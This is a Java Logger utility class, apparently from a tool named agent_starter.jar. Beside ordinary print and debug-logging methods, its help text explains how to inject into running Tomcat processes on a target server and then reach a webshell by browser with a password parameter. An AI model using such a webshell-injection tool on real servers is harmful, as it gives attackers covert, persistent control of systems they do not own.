package util;

import cons.Constants;

public class Logger {
    public static void print(Object x) {
        System.out.println(x);
        if ("true".equals(Constants.DEBUG)) {
            FileUtil.outPutLog(String.valueOf(x));
        }
    }

    public static void printErr(Object x) {
        System.err.println("[Error] " + x);
    }

    public static void help() {
        System.out.println("1.List all Java processes:\r\njava -jar agent_starter.jar list");
        System.out.println("2.Usage:\r\njava -jar agent_starter.jar <displayName> <tomcat_version>\r\nexample: java -jar agent_starter.jar \"org.apache.catalina.startup.Bootstrap start\" 8");
        System.out.println("The default Tomcat version is: 8");
        System.out.println("If multiple processes with the same displayName are running on the target server, they will be injected in turn.");
        System.out.println("3.Connect to webshell:\r\nBrowser access:https://x.x.x.x/xxxxx?password=yourPassword");
    }

    public static void tips() {
        System.out.println("Run \"java -jar " + Constants.AGENT_STARTER + " help\" to view more help information.");
    }
}
